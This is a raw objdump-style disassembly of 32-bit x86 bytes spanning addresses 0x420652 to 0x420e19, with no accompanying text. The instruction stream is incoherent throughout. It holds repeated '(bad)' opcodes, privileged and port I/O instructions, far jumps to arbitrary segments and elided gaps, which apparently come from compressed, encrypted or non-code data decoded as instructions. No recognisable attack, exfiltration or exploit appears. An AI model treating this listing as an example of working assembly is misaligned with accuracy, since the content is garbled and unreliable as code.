  420652:	leave  
  420653:	bound  ebp,QWORD PTR [ebp-0x7]
  420656:	dec    ecx
  420657:	jne    0x420615
  420659:	push   0x43256315
  42065e:	push   ecx
  42065f:	aam    0xba
  420661:	sbb    cl,BYTE PTR [edx]
  420663:	fld    QWORD PTR [ecx+edi*8]
  420666:	test   DWORD PTR fs:[eax*4-0x75b63f3a],edi
  42066e:	xchg   ebx,eax
  42066f:	cmp    DWORD PTR [ebx],0x4f492f44
  420675:	bound  ebx,QWORD PTR [edx]
  420677:	adc    bl,dl
  420679:	dec    ebp
  42067a:	ins    DWORD PTR es:[edi],dx
  42067b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42067c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42067d:	push   cs
  42067e:	ret    0x415f
  420681:	rcl    BYTE PTR [esi+0x12],1
  420684:	pusha  
  420685:	push   es
  420686:	pop    eax
  420687:	push   ds
  420688:	mov    dh,ch
  42068a:	add    al,ch
  42068c:	(bad)  [edx-0x48]
  42068f:	xor    BYTE PTR ds:0xb1c655e9,al
  420695:	inc    edi
  420696:	mov    DWORD PTR [edx-0x23],eax
  420699:	mov    ss,esp
  42069b:	and    eax,0x9186f6e1
  4206a0:	jl     0x42062c
  4206a2:	pop    ds
  4206a3:	add    DWORD PTR [ebp-0x54ca0c62],0xd2e6503
  4206ad:	lods   eax,DWORD PTR ds:[esi]
  4206ae:	add    BYTE PTR [eax-0x45c566e7],0xf6
  4206b5:	mov    al,ds:0xe5340add
  4206ba:	fs mov bl,0xb
  4206bd:	dec    edi
  4206be:	and    ecx,ebx
  4206c0:	xor    BYTE PTR [eax-0x38],al
  4206c3:	stos   DWORD PTR es:[edi],eax
  4206c4:	lock (bad) 
  4206c7:	mov    BYTE PTR [edx],dl
  4206c9:	loopne 0x420710
  4206cb:	rcr    BYTE PTR [edi],1
  4206cd:	es jb  0x4206b2
  4206d0:	aas    
  4206d1:	cdq    
  4206d2:	popa   
  4206d3:	or     edx,DWORD PTR [edx+0x396e68e7]
  4206d9:	mov    esi,0xf7dfec95
  4206de:	into   
  4206df:	frstor [ecx-0x66f35ae0]
  4206e5:	popa   
  4206e6:	xchg   ebp,eax
  4206e7:	jge    0x420699
  4206e9:	cmp    edx,DWORD PTR [edi]
  4206eb:	add    al,0xda
  4206ed:	or     DWORD PTR [ebx-0x66],ecx
  4206f0:	in     al,dx
  4206f1:	mov    al,0xcd
  4206f3:	lock nop
  4206f5:	lods   eax,DWORD PTR ds:[esi]
  4206f6:	clc    
  4206f7:	xchg   DWORD PTR [ebp-0x4e6cb235],ecx
  4206fd:	add    cl,BYTE PTR [ecx]
  4206ff:	inc    esi
  420700:	mov    dh,0xda
  420702:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420703:	xchg   ebp,eax
  420704:	xlat   BYTE PTR ds:[ebx]
  420705:	push   esp
  420706:	xor    cl,dh
  420708:	add    eax,esi
  42070a:	loope  0x420787
  42070c:	pop    ds
  42070d:	enter  0x3393,0x82
  420711:	or     ecx,DWORD PTR [eax]
  420713:	pop    ebx
  420714:	and    DWORD PTR [eax-0x1396af22],ebp
  42071a:	fidivr WORD PTR [ecx-0x56]
  42071d:	push   es
  42071e:	mov    ds:0x1a2044dc,eax
  420723:	bound  ebx,QWORD PTR [eax]
  420725:	pop    ds
  420726:	add    edx,DWORD PTR [edx]
  420728:	mov    dl,0x34
  42072a:	xchg   ebp,eax
  42072b:	push   esi
  42072c:	jne    0x4206b9
  42072e:	out    dx,eax
  42072f:	(bad)  
  420730:	dec    edi
  420731:	fcomp  QWORD PTR [ebx]
  420733:	or     BYTE PTR [esi+0x1b],dh
  420736:	jg     0x4206d0
  420738:	scas   al,BYTE PTR es:[edi]
  420739:	mov    dl,BYTE PTR [edx-0x529713bf]
  42073f:	inc    esp
  420740:	xchg   ebp,eax
  420741:	mov    cl,0xe
  420743:	std    
  420744:	pop    esp
  420745:	loop   0x42073f
  420747:	sbb    BYTE PTR [edx+0x2c],ch
  42074a:	and    esi,DWORD PTR [eax-0xb14a381]
  420750:	pop    ss
  420751:	pushf  
  420752:	mov    dl,0x1b
  420754:	sub    eax,0xabf7dfda
  420759:	call   0x64b9:0xef51abc9
  420760:	in     eax,0xd
  420762:	retf   0xa415
  420765:	inc    edx
  420766:	or     DWORD PTR [ebx-0x3f84cf77],esi
  42076c:	dec    edi
  42076d:	bound  edx,QWORD PTR [ebp+0x61]
  420770:	mov    cl,0xca
  420772:	push   0xb
  420774:	sahf   
  420775:	adc    ebp,DWORD PTR ds:0xa5e1d5cd
  42077b:	loopne 0x420768
  42077d:	bound  esi,QWORD PTR [ecx+0x3fd7364d]
  420783:	fisttp DWORD PTR [ebp-0x6d]
  420786:	cmp    edi,ebp
  420788:	xchg   edx,eax
  420789:	fbld   TBYTE PTR [ebx+0x4e8765d5]
  42078f:	imul   edi,DWORD PTR [esi],0x66
  420792:	or     BYTE PTR [ebx-0x80],al
  420795:	or     eax,0x74825974
  42079a:	out    0xa0,al
  42079c:	enter  0x9148,0xd7
  4207a0:	sbb    BYTE PTR [ebx-0x7c],0x9
  4207a4:	vmread eax,esi
  4207a7:	mov    dh,BYTE PTR [edi+0x4254598c]
  4207ad:	fisub  DWORD PTR [ebx-0x8]
  4207b0:	cmp    BYTE PTR ds:0x632e9397,ch
  4207b6:	pop    eax
  4207b7:	ror    DWORD PTR [esp+esi*2],0x3e
  4207bb:	in     al,dx
  4207bc:	pop    esi
  4207bd:	inc    ecx
  4207be:	mov    ss,WORD PTR [edx+0x61]
  4207c1:	mov    dl,dl
  4207c3:	dec    edi
  4207c4:	fild   QWORD PTR [esp+eiz*8-0x7b70fa30]
  4207cb:	(bad)  
  4207cc:	dec    eax
  4207cd:	sahf   
  4207ce:	jnp    0x4207b7
  4207d0:	mov    ds:0x1f1114be,eax
  4207d5:	push   ebp
  4207d6:	bound  ebx,QWORD PTR [edx]
  4207d8:	mov    dh,0x98
  4207da:	sub    eax,0xc5df1166
  4207df:	add    ebp,DWORD PTR [edx-0x70cf84f3]
  4207e5:	hlt    
  4207e6:	lods   al,BYTE PTR ds:[esi]
  4207e7:	in     al,dx
  4207e8:	xchg   DWORD PTR [esi],esp
  4207ea:	pop    ebp
  4207eb:	adc    eax,0x329b34fb
  4207f0:	lods   eax,DWORD PTR ds:[esi]
  4207f1:	idiv   DWORD PTR [ecx-0x20]
  4207f4:	and    eax,0xc6d8f055
  4207f9:	loopne 0x4207bc
  4207fb:	gs xchg ecx,eax
  4207fd:	in     eax,dx
  4207fe:	push   ebx
  4207ff:	les    eax,FWORD PTR ds:0x1ccaa2
  420805:	adc    eax,0x93ed8bf2
  42080a:	adc    al,0xed
  42080c:	scas   al,BYTE PTR es:[edi]
  42080d:	dec    ebx
  42080e:	jns    0x420810
	...
  420818:	add    BYTE PTR [eax],al
  42081a:	ja     0x420868
  42081c:	idiv   dh
  42081e:	(bad)  
  42081f:	(bad)  
  420820:	jg     0x4207ef
  420822:	mul    BYTE PTR [ebx-0x3e79d003]
  420828:	(bad)  
  420829:	lea    eax,ds:0xfd000185
  42082f:	add    DWORD PTR [eax],eax
  420831:	add    BYTE PTR [ebp+0x74e04834],dl
  420837:	ret    
  420838:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420839:	jecxz  0x4207e5
  42083b:	jge    0x420828
  42083d:	sbb    al,0xfa
  42083f:	rcl    edx,0xde
  420842:	mov    dh,0x18
  420844:	ins    DWORD PTR es:[edi],dx
  420845:	das    
  420846:	daa    
  420847:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420848:	ror    edi,1
  42084a:	das    
  42084b:	cs aam 0xb4
  42084e:	xchg   esp,eax
  42084f:	js     0x420867
  420851:	imul   esi,DWORD PTR [eax],0xffffffa2
  420854:	ror    DWORD PTR [edi],cl
  420856:	cwde   
  420857:	(bad)  
  420858:	and    al,0xd0
  42085a:	test   ch,0x8f
  42085d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42085e:	(bad)  [edx]
  420860:	rcr    BYTE PTR [ebp-0x3b22aca7],cl
  420866:	outs   dx,BYTE PTR ds:[esi]
  420867:	(bad)  
  420868:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420869:	mov    al,ds:0x80c05be0
  42086e:	push   ss
  42086f:	jmp    0x59cad8e5
  420874:	(bad)  
  420875:	sahf   
  420876:	xor    DWORD PTR [edx-0x6],ebx
  420879:	out    dx,eax
  42087a:	xor    al,al
  42087c:	lods   al,BYTE PTR ds:[esi]
  42087d:	ret    0x88c4
  420880:	loope  0x42084c
  420882:	mov    dl,0x35
  420884:	jle    0x420833
  420886:	or     ebx,edx
  420888:	xor    ebp,esi
  42088a:	jns    0x42084a
  42088c:	push   0x6c
  42088e:	adc    dx,dx
  420891:	out    dx,al
  420892:	pop    edx
  420893:	xlat   BYTE PTR ds:[ebx]
  420894:	jbe    0x420837
  420896:	data16 add al,0xd9
  420899:	xor    ecx,DWORD PTR [eax+ebx*2-0x327586fb]
  4208a0:	nop
  4208a1:	jo     0x4208c8
  4208a3:	adc    bl,BYTE PTR [ecx]
  4208a5:	and    ecx,DWORD PTR [esi+0x1c8ae27c]
  4208ab:	add    ebp,DWORD PTR [ecx+0xc]
  4208ae:	int3   
  4208af:	in     eax,0xcf
  4208b1:	icebp  
  4208b2:	push   cs
  4208b3:	jmp    0xdf760d2a
  4208b8:	lods   eax,DWORD PTR ds:[esi]
  4208b9:	add    DWORD PTR [esi+esi*4-0x5e523bf4],edx
  4208c0:	repz dec ebp
  4208c2:	iret   
  4208c3:	(bad)
  4208c6:	push   0x496ba567
  4208cb:	sahf   
  4208cc:	xchg   ebx,eax
  4208cd:	sbb    BYTE PTR [edx],bh
  4208cf:	les    esp,FWORD PTR [eax-0x828cf90]
  4208d5:	js     0x420875
  4208d7:	addr16 xchg ebx,eax
  4208d9:	(bad)  
  4208da:	xchg   ebp,eax
  4208db:	and    edi,DWORD PTR [edx+eiz*8-0x4f44d726]
  4208e2:	cs mov ecx,0x9ac2673e
  4208e8:	lea    esi,[esi-0x41317d69]
  4208ee:	aad    0x63
  4208f0:	addr16 jae 0x42094a
  4208f3:	pop    ecx
  4208f4:	iret   
  4208f5:	ss pop ds
  4208f7:	push   ds
  4208f8:	xor    eax,0x1570f674
  4208fd:	fucomp st(2)
  4208ff:	fstp   TBYTE PTR [ebx-0x1f]
  420902:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420903:	dec    ebx
  420904:	iret   
  420905:	stos   BYTE PTR es:[edi],al
  420906:	add    DWORD PTR [ebp-0x2d199772],0xffffff84
  42090d:	mov    es:0x854df00a,eax
  420913:	sub    eax,0xfa6a5058
  420918:	ja     0x42089b
  42091a:	push   edi
  42091b:	jne    0x4208f7
  42091d:	or     BYTE PTR [eax+0x6e],ch
  420920:	jbe    0x420912
  420922:	pushw  0x60
  420925:	js     0x420954
  420927:	pop    esp
  420928:	nop
  420929:	les    eax,FWORD PTR [eax+eax*2+0x3f758163]
  420930:	xor    eax,0xf963543a
  420935:	mov    al,ds:0xc9d497fa
  42093a:	imul   DWORD PTR [ebx-0x7ca3bad8]
  420940:	stc    
  420941:	pusha  
  420942:	imul   edi,DWORD PTR [ebp+0x65],0xfffffff1
  420946:	nop
  420947:	adc    esi,0x4e
  42094a:	mov    ecx,esi
  42094c:	(bad)  
  42094d:	mov    edx,0xa167ac38
  420952:	inc    esi
  420953:	mov    fs,WORD PTR [eax+0x14fb1e2b]
  420959:	xchg   DWORD PTR [ebx-0x38],esi
  42095c:	sub    edx,DWORD PTR [edx+0x6c]
  42095f:	or     al,0x6
  420961:	btc    DWORD PTR [ecx+0x58],ebx
  420965:	xor    ebx,ecx
  420967:	push   ecx
  420968:	hlt    
  420969:	stos   BYTE PTR es:[edi],al
  42096a:	sub    eax,0x2d205279
  42096f:	sahf   
  420970:	jae    0x420910
  420972:	cmc    
  420973:	adc    al,dl
  420975:	pop    edi
  420976:	shl    BYTE PTR [ecx-0x79c120b4],0xea
  42097d:	push   eax
  42097e:	(bad)  
  42097f:	std    
  420980:	ret    0x7808
  420983:	fadd   QWORD PTR [eax+ebx*1]
  420986:	mov    dh,0x50
  420988:	xchg   esi,eax
  420989:	cmc    
  42098a:	mov    DWORD PTR [ebx],ecx
  42098c:	mov    ah,0x35
  42098e:	push   ecx
  42098f:	pusha  
  420990:	push   ds
  420991:	mov    BYTE PTR [esi-0x63eb3a5f],ch
  420997:	in     al,dx
  420998:	pop    ebp
  420999:	cdq    
  42099a:	fisttp DWORD PTR ds:0x7bf2d96b
  4209a0:	push   0x32
  4209a2:	pop    ds
  4209a3:	sbb    DWORD PTR [ebx-0x1a01f6ea],ecx
  4209a9:	fldcw  WORD PTR [ebx]
  4209ab:	pop    es
  4209ac:	jle    0x4209f2
  4209ae:	repnz and edi,DWORD PTR [edi+0x34fb74d2]
  4209b5:	pop    eax
  4209b6:	adc    ax,0x498b
  4209ba:	sub    BYTE PTR [eax],0x97
  4209bd:	jnp    0x420a23
  4209bf:	mov    WORD PTR [ecx+0x56],es
  4209c2:	sbb    ecx,ebp
  4209c4:	push   cs
  4209c5:	pop    es
  4209c6:	rcr    esi,1
  4209c8:	xchg   edx,eax
  4209c9:	test   ah,0xd
  4209cc:	cs xor al,0x8c
  4209cf:	sub    eax,0x455016a7
  4209d4:	and    bl,BYTE PTR [ebp+0x64]
  4209d7:	ins    BYTE PTR es:[edi],dx
  4209d8:	xchg   esi,eax
  4209d9:	sbb    BYTE PTR ds:0xb953c88a,0xaf
  4209e0:	or     al,0x7c
  4209e2:	and    bh,ah
  4209e4:	daa    
  4209e5:	jns    0x42098c
  4209e7:	mov    dh,0x9f
  4209e9:	pop    ds
  4209ea:	jecxz  0x420a67
  4209ec:	mov    bh,0x9e
  4209ee:	and    al,0x79
  4209f0:	push   edi
  4209f1:	outs   dx,BYTE PTR ds:[esi]
  4209f2:	pop    edi
  4209f3:	xor    al,0xd8
  4209f5:	icebp  
  4209f6:	loopne 0x42097b
  4209f8:	pop    es
  4209f9:	jmp    0x7d35:0xb57eedfe
  420a00:	scas   al,BYTE PTR es:[edi]
  420a01:	push   ds
  420a02:	(bad)  
  420a03:	jbe    0x420a32
  420a05:	aaa    
  420a06:	cwde   
  420a07:	inc    edi
  420a08:	icebp  
  420a09:	mov    bh,0xfd
  420a0b:	pushf  
  420a0c:	div    DWORD PTR [edi]
  420a0e:	nop
  420a0f:	or     edi,DWORD PTR [ecx+0x3e16d788]
  420a15:	aas    
  420a16:	add    eax,0xa64ff126
  420a1b:	and    eax,0xa2b5e061
  420a20:	mov    ecx,0xd9740e09
  420a25:	icebp  
  420a26:	pop    ds
  420a27:	add    DWORD PTR [ebx],esi
  420a29:	fild   WORD PTR [edi+0x328902d1]
	...
  420a37:	add    BYTE PTR [eax],al
  420a39:	add    BYTE PTR [edi],al
  420a3b:	sbb    cl,BYTE PTR [ecx-0x686462e6]
  420a41:	pop    ds
  420a42:	(bad)  
  420a44:	std    
  420a45:	jg     0x420a0d
  420a47:	les    ecx,FWORD PTR [ecx+0x19]
  420a4a:	add    al,BYTE PTR [edi+0x1fd0001]
  420a50:	add    BYTE PTR [eax],al
  420a52:	mov    cl,BYTE PTR [edi]
  420a54:	xor    esi,DWORD PTR [ecx-0x4c]
  420a57:	xor    ebp,DWORD PTR [ecx]
  420a59:	push   0x56
  420a5b:	xchg   ebx,eax
  420a5c:	xchg   esi,eax
  420a5d:	aas    
  420a5e:	inc    edi
  420a5f:	cli    
  420a60:	cs push esi
  420a62:	fdivr  QWORD PTR [ecx-0x14]
  420a65:	mov    bl,0x34
  420a67:	pop    esp
  420a68:	push   ebp
  420a69:	pusha  
  420a6a:	test   ch,ah
  420a6c:	lahf   
  420a6d:	and    esp,DWORD PTR [edx+edx*2-0x56]
  420a71:	int3   
  420a72:	push   ebx
  420a73:	(bad)  
  420a74:	cmp    BYTE PTR [esi],al
  420a76:	xchg   edi,eax
  420a77:	test   DWORD PTR [edx-0x38e49c08],edi
  420a7d:	adc    BYTE PTR [ebx+0x7b],bl
  420a80:	in     eax,0x86
  420a82:	cmp    cl,bl
  420a84:	inc    esp
  420a85:	in     eax,0x84
  420a87:	adc    esi,esp
  420a89:	lea    eax,[ebx+0x1daaacf1]
  420a8f:	pop    es
  420a90:	and    DWORD PTR [ebp+0x27],ebx
  420a93:	push   eax
  420a94:	mov    WORD PTR [esi+esi*2],ss
  420a97:	pop    esp
  420a98:	dec    esi
  420a99:	stos   BYTE PTR es:[edi],al
  420a9a:	setno  BYTE PTR [ecx]
  420a9d:	mov    cl,0x3c
  420a9f:	jns    0xa97a870b
  420aa5:	adc    DWORD PTR [edi-0x14c9d5eb],esp
  420aab:	mov    ch,0xb4
  420aad:	in     eax,dx
  420aae:	adc    al,0xb
  420ab0:	jmp    0x966fa461
  420ab5:	ror    DWORD PTR [ebp-0x4d],1
  420ab8:	das    
  420ab9:	retf   0x4d48
  420abc:	sti    
  420abd:	pop    edx
  420abe:	sub    eax,0x313259f9
  420ac3:	sbb    DWORD PTR [eax+ebp*4-0x2d44f5a1],eax
  420aca:	(bad)  [edx+0x14e72351]
  420ad0:	adc    eax,0xebf6944f
  420ad5:	ret    0x798c
  420ad8:	xchg   ebx,eax
  420ad9:	xor    esp,ebp
  420adb:	(bad)  
  420adc:	mov    ch,0xf7
  420ade:	adc    bl,BYTE PTR ss:[eax-0x14]
  420ae2:	fsub   DWORD PTR [esi-0x8f37bea]
  420ae8:	sbb    BYTE PTR [ecx-0x7a1dc44],dl
  420aee:	aas    
  420aef:	maxps  xmm2,XMMWORD PTR [eax]
  420af2:	setle  BYTE PTR ss:[ebx+0x7e3a431e]
  420afa:	lods   al,BYTE PTR ds:[esi]
  420afb:	pop    ebx
  420afc:	xchg   dh,ah
  420afe:	icebp  
  420aff:	push   0x6983e573
  420b04:	push   0x74be7cd4
  420b09:	jecxz  0x420a9c
  420b0b:	sub    DWORD PTR [ebp+0x31],ebx
  420b0e:	lods   al,BYTE PTR ds:[esi]
  420b0f:	mov    esi,0x5469ec14
  420b14:	xor    BYTE PTR [edx-0xafe499f],0xe6
  420b1b:	push   eax
  420b1c:	scas   al,BYTE PTR es:[edi]
  420b1d:	jl     0x420ae1
  420b1f:	ds pop ebp
  420b21:	arpl   WORD PTR [ebp+0x60],di
  420b24:	or     al,0xf9
  420b26:	out    0x37,al
  420b28:	cmp    eax,0x723d63b3
  420b2d:	jmp    0x356:0xbaf768a0
  420b34:	call   0x118a:0xe976c67b
  420b3b:	hlt    
  420b3c:	push   0x16
  420b3e:	sub    al,0x6f
  420b40:	arpl   WORD PTR [esi+0xf0effe7],si
  420b46:	jmp    0x383c5c08
  420b4b:	out    dx,eax
  420b4c:	jne    0x420ae0
  420b4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b4f:	mov    esp,0xf207871d
  420b54:	sub    BYTE PTR [ebx-0x1e9c9c13],cl
  420b5a:	mov    edx,0xb079883f
  420b5f:	or     esi,DWORD PTR [ebp-0x25bf4b1c]
  420b65:	in     al,dx
  420b66:	leave  
  420b67:	pop    edi
  420b68:	je     0x420b53
  420b6a:	shr    DWORD PTR [eax+esi*2],0xbd
  420b6e:	in     eax,dx
  420b6f:	mov    WORD PTR [edi-0x60f7e418],es
  420b75:	mov    al,BYTE PTR [esi-0x71]
  420b78:	je     0x420bbd
  420b7a:	push   eax
  420b7b:	push   ecx
  420b7c:	cmp    bl,BYTE PTR [eax-0x57]
  420b7f:	dec    edx
  420b80:	mov    ecx,0x59cca86f
  420b85:	sub    edi,DWORD PTR [edi+0x4e]
  420b88:	jmp    0xcb65164b
  420b8d:	fwait
  420b8e:	push   esi
  420b8f:	mov    edi,0xf27b9fa1
  420b94:	jg     0x420c05
  420b96:	jne    0x420b84
  420b98:	push   edi
  420b99:	mov    WORD PTR [ecx-0x6f],es
  420b9c:	add    BYTE PTR [edi+ebx*1+0x3a],al
  420ba0:	sub    bh,0x15
  420ba3:	test   al,0x39
  420ba5:	pop    ss
  420ba6:	sbb    al,dh
  420ba8:	xchg   esp,eax
  420ba9:	push   ebx
  420baa:	outs   dx,DWORD PTR ds:[esi]
  420bab:	lds    edi,FWORD PTR [ebx+0x3825f619]
  420bb1:	sbb    bh,BYTE PTR [ecx]
  420bb3:	lea    eax,[edx+ecx*4]
  420bb6:	mov    dh,0xbd
  420bb8:	imul   ecx,DWORD PTR [edi-0x1d2ea144],0xd5d4067
  420bc2:	test   DWORD PTR [eax],ebp
  420bc4:	das    
  420bc5:	daa    
  420bc6:	push   ebx
  420bc7:	sti    
  420bc8:	jbe    0x420bbd
  420bca:	loope  0x420c37
  420bcc:	ret    
  420bcd:	push   ebx
  420bce:	aad    0x94
  420bd0:	ins    DWORD PTR es:[edi],dx
  420bd1:	popa   
  420bd2:	jno    0x420bb5
  420bd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420bd5:	mov    esi,0x7a0f061b
  420bda:	das    
  420bdb:	or     ecx,DWORD PTR [bx+di-0x3b]
  420bdf:	fild   WORD PTR [edi+0x624682c6]
  420be5:	xchg   ebp,eax
  420be6:	add    dh,BYTE PTR [edx-0x2b]
  420be9:	pop    ds
  420bea:	cdq    
  420beb:	xchg   edx,eax
  420bec:	fist   WORD PTR [ebp+0x60]
  420bef:	rol    DWORD PTR [ebp+0x30],0x7d
  420bf3:	add    BYTE PTR [edx-0x27],ch
  420bf6:	mov    bh,0xed
  420bf8:	xchg   DWORD PTR [edi-0x54],eax
  420bfb:	lock out 0x83,al
  420bfe:	mov    ds:0x20a505d,al
  420c03:	inc    edx
  420c04:	out    0x1b,eax
  420c06:	sub    BYTE PTR [edi+0x6923daf9],0xe5
  420c0d:	pop    esp
  420c0e:	ins    DWORD PTR es:[edi],dx
  420c0f:	call   0xbf74:0xb2a907de
  420c16:	pop    es
  420c17:	into   
  420c18:	int3   
  420c19:	xchg   ebx,eax
  420c1a:	dec    ecx
  420c1b:	lods   eax,DWORD PTR ds:[esi]
  420c1c:	mov    esp,0x4148a270
  420c21:	sub    DWORD PTR [edi*2-0x6a10907],edi
  420c28:	dec    esi
  420c29:	push   cs
  420c2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c2b:	and    DWORD PTR [ebp+ebx*8+0x7f],edx
  420c2f:	sub    DWORD PTR [esi],edx
  420c31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c32:	jno    0x420c57
  420c34:	sub    al,0x3f
  420c36:	pop    edx
  420c37:	test   BYTE PTR [ebx-0x3f],ch
  420c3a:	mov    ds:0x113ea796,eax
  420c3f:	pop    es
  420c40:	pop    ebx
  420c41:	(bad)  
  420c42:	push   esp
  420c43:	mov    cl,0x6a
  420c45:	dec    ebp
  420c46:	jno    0x420c22
  420c48:	imul   bl
  420c4a:	sbb    eax,edx
  420c4c:	xchg   esi,eax
  420c4d:	pop    edx
  420c4e:	add    BYTE PTR fs:[eax],al
	...
  420c59:	add    BYTE PTR [esi],bl
  420c5b:	add    al,0xa7
  420c5d:	(bad)  
  420c5e:	mov    edi,0x7bdd7ee7
  420c63:	int    0x75
  420c65:	mov    WORD PTR [ebx-0xec77a0],ss
  420c6b:	mov    BYTE PTR [ecx],al
  420c6d:	add    ch,bh
  420c6f:	add    DWORD PTR [eax],eax
  420c71:	add    BYTE PTR [edx-0x5a06391],dl
  420c77:	xchg   ecx,eax
  420c78:	(bad)  
  420c79:	cld    
  420c7a:	or     eax,0x46f5a5c8
  420c7f:	retf   0x735d
  420c82:	add    ebx,eax
  420c84:	std    
  420c85:	mov    al,0xf7
  420c87:	mov    ebx,DWORD PTR [edi-0x5fa02bb5]
  420c8d:	xor    BYTE PTR [esi],bl
  420c8f:	mov    WORD PTR [edi],es
  420c91:	loope  0x420c7e
  420c93:	mov    DWORD PTR [edx-0x2f9d1f99],esi
  420c99:	adc    al,0xc
  420c9b:	adc    bl,ch
  420c9d:	cmp    BYTE PTR [eax],dl
  420c9f:	cmp    DWORD PTR [esi],edi
  420ca1:	sub    ah,BYTE PTR [edx-0x66]
  420ca4:	pop    edx
  420ca5:	inc    ecx
  420ca6:	fsub   DWORD PTR [ebx-0x3538a030]
  420cac:	pop    ebp
  420cad:	test   al,0xae
  420caf:	pop    edi
  420cb0:	jae    0x420c48
  420cb2:	mov    ds:0x790ee331,al
  420cb7:	jp     0x420c50
  420cb9:	add    DWORD PTR [edi],0xffffffe8
  420cbc:	lahf   
  420cbd:	mov    bh,0x8f
  420cbf:	lods   al,BYTE PTR ds:[esi]
  420cc0:	push   esp
  420cc1:	test   cl,bl
  420cc3:	test   eax,0xe799a872
  420cc8:	or     ecx,ebp
  420cca:	out    0xc,al
  420ccc:	sub    bh,BYTE PTR [ebx+0x42c2c69f]
  420cd2:	jmp    0x420d3d
  420cd4:	loope  0x420d34
  420cd6:	sbb    esp,ebx
  420cd8:	test   al,0xc0
  420cda:	scas   al,BYTE PTR es:[edi]
  420cdb:	test   esi,edx
  420cdd:	(bad)  
  420cde:	div    BYTE PTR [eax+ebp*1+0x4d58cbfc]
  420ce5:	pop    esp
  420ce6:	popa   
  420ce7:	adc    al,BYTE PTR [edi-0x70]
  420cea:	xor    eax,0x2b4debee
  420cef:	(bad)  
  420cf0:	pop    ss
  420cf1:	or     BYTE PTR [edx+0x761b9c2a],ah
  420cf7:	jle    0x420ca4
  420cf9:	xor    bl,ch
  420cfb:	retf   
  420cfc:	ror    DWORD PTR [edi-0x1d2266a9],0x36
  420d03:	(bad)  
  420d05:	mov    esp,0xe0d69154
  420d0a:	adc    ah,BYTE PTR ds:0x355b912b
  420d10:	add    BYTE PTR [eax+0x25],0xe4
  420d14:	in     al,dx
  420d15:	sub    dh,BYTE PTR [ecx+0x1c]
  420d18:	sub    eax,0x521999ec
  420d1d:	stos   DWORD PTR es:[edi],eax
  420d1e:	daa    
  420d1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d20:	lods   al,BYTE PTR ds:[esi]
  420d21:	mov    eax,ds:0x35f3210c
  420d26:	cli    
  420d27:	mov    esp,0xce3fc692
  420d2c:	dec    ebx
  420d2d:	xchg   DWORD PTR [edx],esi
  420d2f:	mov    ebp,0x94ef580c
  420d34:	mov    WORD PTR [esi+0xe5cb294],cs
  420d3a:	sbb    eax,0xd3b76f9b
  420d3f:	(bad)  
  420d40:	loope  0x420d12
  420d42:	cs xchg ebp,eax
  420d44:	pop    es
  420d45:	fadd   st,st(0)
  420d47:	mov    bh,0x3c
  420d49:	push   eax
  420d4a:	nop
  420d4b:	outs   dx,DWORD PTR ds:[esi]
  420d4c:	addr16 mov al,0x5d
  420d4f:	xchg   ebp,eax
  420d50:	cld    
  420d51:	jae    0x420cd8
  420d53:	push   ecx
  420d54:	fisub  WORD PTR [ebx+0x18]
  420d57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d58:	jl     0x420dab
  420d5a:	add    al,0x1
  420d5c:	xlat   BYTE PTR ds:[ebx]
  420d5d:	(bad)  
  420d5e:	aam    0x8d
  420d60:	add    al,0x38
  420d62:	lock adc esi,DWORD PTR [ecx+0x39]
  420d66:	and    al,0x7b
  420d68:	mov    al,ds:0x7ab92cce
  420d6d:	fild   QWORD PTR [edi]
  420d6f:	jmp    0x1c8d:0x39292c6d
  420d76:	aad    0x9a
  420d78:	imul   edx,DWORD PTR [esi-0x6f],0xffffffa5
  420d7c:	dec    ebp
  420d7d:	pop    es
  420d7e:	mov    ah,BYTE PTR [ecx]
  420d80:	cmp    edx,esp
  420d82:	sub    DWORD PTR [edx+ebp*2],esi
  420d85:	mov    esp,eax
  420d87:	pop    esi
  420d88:	and    ah,ch
  420d8a:	push   eax
  420d8b:	dec    eax
  420d8c:	aad    0x50
  420d8e:	pop    edi
  420d8f:	adc    al,0xd7
  420d91:	pushf  
  420d92:	inc    esp
  420d93:	mov    ecx,0x96450eb5
  420d98:	xor    al,0x33
  420d9a:	repz mov bh,0xe2
  420d9d:	sahf   
  420d9e:	sti    
  420d9f:	push   edi
  420da0:	lds    ebp,FWORD PTR [edx]
  420da2:	xor    DWORD PTR [ebp+0x50d99fc8],edx
  420da8:	cmp    eax,0x9a23235d
  420dad:	adc    BYTE PTR [eax-0x52ed1bc3],dl
  420db3:	push   esi
  420db4:	enter  0x6fc3,0x4c
  420db8:	mov    eax,ds:0xef210e0f
  420dbd:	sti    
  420dbe:	push   esp
  420dbf:	ds mov esp,0xf0b08add
  420dc5:	or     edi,ebp
  420dc7:	aaa    
  420dc8:	jl     0x420e05
  420dca:	and    eax,0xf8beb839
  420dcf:	lods   eax,DWORD PTR ds:[esi]
  420dd0:	jge    0x420d8c
  420dd2:	and    DWORD PTR [edx+edx*8],ebx
  420dd5:	gs ds adc eax,0xf8436edf
  420ddc:	ss int3 
  420dde:	push   0xffffffc5
  420de0:	pop    ds
  420de1:	loope  0x420dac
  420de3:	xchg   ebp,eax
  420de4:	adc    DWORD PTR ds:0xdd653d19,edx
  420dea:	cmc    
  420deb:	and    BYTE PTR [edx],0x68
  420dee:	mov    ecx,esp
  420df0:	aas    
  420df1:	or     BYTE PTR [edx+0x1affccea],bh
  420df7:	push   esp
  420df8:	mov    esi,0xac3390ed
  420dfd:	xchg   ebx,eax
  420dfe:	xchg   DWORD PTR [edi],ebp
  420e00:	jne    0x420e6f
  420e02:	push   ss
  420e03:	je     0x420e2f
  420e05:	jbe    0x420e70
  420e07:	cwde   
  420e08:	mov    ecx,0x89654fd0
  420e0d:	mov    edi,0xd80bf06c
  420e12:	jp     0x420df1
  420e14:	mov    ds:0x380fd326,eax
  420e19:	pop    DWORD PTR [edi+0x45]
